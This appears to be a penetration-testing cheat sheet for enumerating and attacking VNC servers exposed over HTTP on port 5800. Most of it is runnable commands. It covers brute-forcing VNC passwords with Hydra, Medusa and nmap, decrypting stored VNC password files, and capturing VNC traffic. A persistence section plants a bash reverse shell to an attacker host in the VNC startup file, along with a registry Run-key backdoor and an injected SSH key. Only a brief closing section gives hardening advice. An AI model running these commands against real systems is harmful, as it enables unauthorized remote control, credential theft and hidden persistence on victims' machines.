# VNC HTTP ENUMERATION (Port 5800)

## SERVICE OVERVIEW
```
Port 5800 is used for VNC over HTTP (Java VNC viewer)
- HTTP access to VNC server
- Serves Java applet for VNC connection
- Companion to port 5900 (native VNC)
- Less secure than native VNC protocol
- Often enabled by default in VNC servers
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p5800 <IP>                             # Service/Version detection
curl -I http://<IP>:5800                         # HTTP headers
wget --server-response --spider http://<IP>:5800 2>&1 | grep "Server:"
nc -nv <IP> 5800                                 # Manual connection
```

## VNC HTTP DETECTION
```bash
# Detect VNC over HTTP
curl http://<IP>:5800 | grep -i "vnc\|realvnc\|tightvnc\|ultravnc"
curl -I http://<IP>:5800 | grep -i "vnc"

# Access VNC viewer page
curl http://<IP>:5800/
firefox http://<IP>:5800/                        # Opens Java VNC applet

# Common VNC HTTP paths
http://<IP>:5800/                                # Main page
http://<IP>:5800/index.html                     # Index
http://<IP>:5800/vnc.html                       # VNC viewer
http://<IP>:5800/VncViewer.jar                  # Java applet
```

## VNC VERSION DETECTION
```bash
# Check for VNC server version
curl http://<IP>:5800/ | grep -i "version\|realvnc\|tightvnc"
nmap -sV -p5800,5900 <IP>                        # Scan both ports

# Common VNC servers:
# - RealVNC
# - TightVNC
# - UltraVNC
# - TigerVNC
# - x11vnc
```

## DOWNLOAD VNC APPLET
```bash
# Download Java VNC viewer applet
wget http://<IP>:5800/VncViewer.jar
wget http://<IP>:5800/VncViewer.class

# Decompile Java applet (may contain hardcoded credentials)
unzip VncViewer.jar
jd-gui VncViewer.jar                             # Java decompiler

# Look for:
# - Hardcoded passwords
# - Encryption keys
# - Authentication methods
# - Server configuration
```

## AUTHENTICATION TESTING
```bash
# VNC authentication types:
# 1. No authentication (None)
# 2. VNC authentication (password only)
# 3. Username + password

# Test for no authentication
# If HTTP viewer loads without password prompt, might be open!

# Access via browser
firefox http://<IP>:5800/
# If it connects without password = No auth!
```

## BRUTE FORCE VNC PASSWORD
```bash
# VNC passwords are max 8 characters (DES limitation)

# Hydra (for native VNC port 5900, not HTTP)
hydra -P passwords.txt vnc://<IP>
hydra -P passwords.txt -s 5900 <IP> vnc

# Medusa
medusa -h <IP> -u "" -P passwords.txt -M vnc

# Nmap
nmap -p5900 --script vnc-brute --script-args userdb=users.txt,passdb=passwords.txt <IP>

# Note: HTTP VNC (5800) requires browser/applet, harder to brute force
# Better to attack native VNC port 5900
```

## DEFAULT VNC PASSWORDS
```bash
# Common VNC default passwords
password
vnc
admin
123456
12345678          # Max length for VNC passwords
PASSW0RD
changeme

# Vendor-specific defaults:
# RealVNC: (no default, must be set)
# TightVNC: (no default)
# UltraVNC: (no default, but often weak)
```

## ACCESSING VNC VIA BROWSER
```bash
# Modern browsers may block Java applets
# Use older browser or allow Java

# Alternative: Use noVNC (HTML5 VNC client)
# If server supports noVNC:
http://<IP>:6080/vnc.html
http://<IP>:5800/vnc_lite.html
```

## CREDENTIAL EXTRACTION
```bash
# VNC password files (if you have file system access)
~/.vnc/passwd                                    # Unix/Linux VNC password
C:\Program Files\RealVNC\VNC Server\config.d\   # Windows RealVNC
C:\Program Files\UltraVNC\ultravnc.ini           # Windows UltraVNC

# VNC passwords are encrypted with hardcoded DES key
# Can be decrypted!

# Decrypt VNC password
vncpwd <password_file>                           # VNC password decrypter
python -c "from d3des import *; print(decrypt('password_hash'))"

# Metasploit VNC password decrypter
use auxiliary/admin/vnc/vnc_password_decrypt
set PASSWD_FILE ~/.vnc/passwd
run
```

## NMAP VNC SCRIPTS
```bash
# VNC enumeration
nmap -p5800,5900 --script vnc-info <IP>          # VNC info
nmap -p5900 --script vnc-brute <IP>              # Brute force
nmap -p5900 --script vnc-title <IP>              # Get desktop title
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/vnc/vnc_none_auth          # No auth scanner
use auxiliary/scanner/vnc/vnc_login              # Login scanner
use auxiliary/admin/vnc/vnc_keyboard             # Send keyboard input (after auth)
set RHOSTS <IP>
set RPORT 5900                                   # Native VNC port
run

# Check port 5800 manually via browser
```

## MAN-IN-THE-MIDDLE ATTACKS
```bash
# VNC over HTTP (5800) is unencrypted by default
# Easy to intercept credentials

# Capture traffic
tcpdump -i eth0 'tcp port 5800' -w vnc.pcap
wireshark (filter: tcp.port == 5800)

# Look for:
# - VNC password (encrypted with weak DES)
# - Keystrokes
# - Screen updates
# - Mouse movements
```

## VULNERABILITY SCANNING
```bash
# Search for VNC exploits
searchsploit vnc
searchsploit realvnc
searchsploit tightvnc
searchsploit ultravnc

# Common VNC vulnerabilities:
# CVE-2019-15681: RealVNC heap corruption
# CVE-2020-14404: LibVNCServer buffer overflow
# CVE-2006-2369: RealVNC authentication bypass
# CVE-2019-8262: UltraVNC buffer overflow

nmap -p5800,5900 --script vuln <IP>
```

## CONNECT TO VNC
```bash
# If you have valid credentials or no auth:

# Via browser (port 5800)
firefox http://<IP>:5800/

# Via native VNC client (port 5900)
vncviewer <IP>:5900
vncviewer <IP>::5900                             # Alternative syntax
vncviewer <IP>:0                                 # Display :0 = port 5900

# With password
vncviewer <IP>:5900 -passwd ~/.vnc/passwd

# TightVNC client
xtightvncviewer <IP>:5900

# RealVNC client
vncviewer <IP>:5900
```

## POST-EXPLOITATION (After VNC Access)
```bash
# After gaining VNC access, you have full desktop control!

# 1. Open terminal/command prompt
# 2. Execute commands
# 3. Install backdoors
# 4. Extract credentials
# 5. Access files
# 6. Install keyloggers
# 7. Pivot to other systems

# Common post-exploitation:
# - Open terminal: whoami, id, uname -a
# - Check for sensitive files
# - Escalate privileges
# - Install SSH backdoor
# - Download files via GUI
```

## PERSISTENCE VIA VNC
```bash
# After gaining access, establish persistence

# Linux: Add to VNC startup
echo "bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1" >> ~/.vnc/xstartup

# Windows: Add VNC startup registry
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v backdoor /t REG_SZ /d "C:\backdoor.exe"

# Add SSH key via VNC GUI
# Open terminal and:
echo "ssh_public_key" >> ~/.ssh/authorized_keys
```

## COMMON MISCONFIGURATIONS
```
☐ No authentication enabled                      # Anyone can connect!
☐ Weak password (< 8 chars)                     # Easy to brute force
☐ Exposed to internet                            # Should be internal/VPN only
☐ Default port 5800/5900                         # Easy to find
☐ No encryption                                  # Plain text traffic
☐ Running as root/Administrator                  # Full system access
☐ No access logging                              # Attacks go unnoticed
☐ Old/vulnerable version                         # Known exploits
```

## QUICK WIN CHECKLIST
```
☐ Test for no authentication
☐ Check both ports 5800 (HTTP) and 5900 (native)
☐ Test default/weak passwords
☐ Download and analyze Java applet
☐ Check VNC server version
☐ Search for version-specific exploits
☐ Test MitM attacks (if on same network)
☐ Look for VNC password files
☐ Try password decryption
☐ Check if VNC tunneled over SSH
```

## ONE-LINER FULL ENUMERATION
```bash
# Comprehensive VNC scan
nmap -sV -p5800,5900 --script "vnc-*" -oA vnc_enum <IP>

# Quick authentication test
nmap -p5900 --script vnc-info <IP>

# Test for no-auth
firefox http://<IP>:5800/
```

## VNC OVER SSH TUNNELING
```bash
# Secure VNC connection via SSH tunnel
ssh -L 5900:localhost:5900 user@<IP>
vncviewer localhost:5900

# Access HTTP VNC via SSH tunnel
ssh -L 5800:localhost:5800 user@<IP>
firefox http://localhost:5800/
```

## ADVANCED TECHNIQUES
```bash
# VNC screen capture without authentication (if vulnerable)
# Some old VNC servers allow partial screen access without auth

# VNC password recovery from memory (if you have local access)
strings /proc/$(pidof Xvnc)/mem | grep -i password

# VNC session hijacking
# If multiple users connected, might be able to view other sessions

# Reverse VNC connection
# Some VNC servers support "listening mode"
# Server connects to attacker's VNC viewer
vncviewer -listen 5500                           # Attacker listens
# Then trigger server to connect back
```

## SECURITY IMPLICATIONS
```
CRITICAL RISKS:
1. No authentication = anyone can view/control desktop
2. Weak DES encryption for passwords
3. Unencrypted traffic (HTTP on 5800)
4. Full desktop control = full system access
5. Can view everything user sees
6. Can execute any commands
7. Often runs with elevated privileges
8. Easy to install backdoors
9. Keylogging possible

RECOMMENDATION:
- Never expose VNC to internet
- Always use VPN or SSH tunnel
- Enable strong authentication
- Use VNC over SSH tunneling
- Update to latest version
- Monitor VNC connections
- Use encryption (TLS/SSL)
- Limit access by IP
- Disable if not needed
```

## PORT MAPPING
```
VNC Display:Port Mapping
Display :0 = Port 5900
Display :1 = Port 5901
Display :2 = Port 5902
...

HTTP VNC = Display Port + 5800
Display :0 = HTTP Port 5800
Display :1 = HTTP Port 5801
Display :2 = HTTP Port 5802
```
